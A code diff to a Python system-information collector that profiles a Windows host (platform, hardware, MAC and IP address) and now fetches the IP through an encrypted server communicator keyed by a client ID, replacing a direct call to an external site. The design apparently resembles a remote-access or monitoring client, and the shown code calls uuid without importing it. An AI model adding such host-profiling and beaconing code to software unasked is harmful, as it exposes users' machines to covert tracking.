@@ -1,12 +1,12 @@
-# ------------ system/collector.py ------------
 import platform
 import psutil
 import winreg
 import os
-import requests
 from config import Config
-from datetime import datetime  # Ensure this is present
-import logging  # Add for debugging
+from datetime import datetime
+import logging
+from network.communicator import ServerCommunicator, CommunicationError
+from encryption.manager import EncryptionManager
 
 class SystemCollector:
     @staticmethod
@@ -30,11 +30,18 @@ class SystemCollector:
     @staticmethod
     def get_network_info():
         try:
+            communicator = ServerCommunicator(Config.get_client_id(), EncryptionManager(Config.ENCRYPTION_KEY))
+            response = communicator._send_request(
+                "action=get_ip",
+                data={"client_id": Config.get_client_id()}
+            )
+            ip_address = response[0].get('ip_address', 'unknown') if response else 'unknown'
             return {
-                "ip_address": requests.get('https://fasitheme.ir/ip.php', timeout=5).text,
+                "ip_address": ip_address,
                 "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])
             }
-        except:
+        except CommunicationError as e:
+            logging.error(f"Network info retrieval error: {str(e)}")
             return {"ip_address": "unknown"}
 
     @staticmethod
@@ -47,7 +54,7 @@ class SystemCollector:
 
     @staticmethod
     def collect_full():
-        logging.info("Collecting system info with datetime")  # Debug log
+        logging.info("Collecting system info with datetime")
         return {
             **SystemCollector.get_platform_info(),
             **SystemCollector.get_hardware_info(),
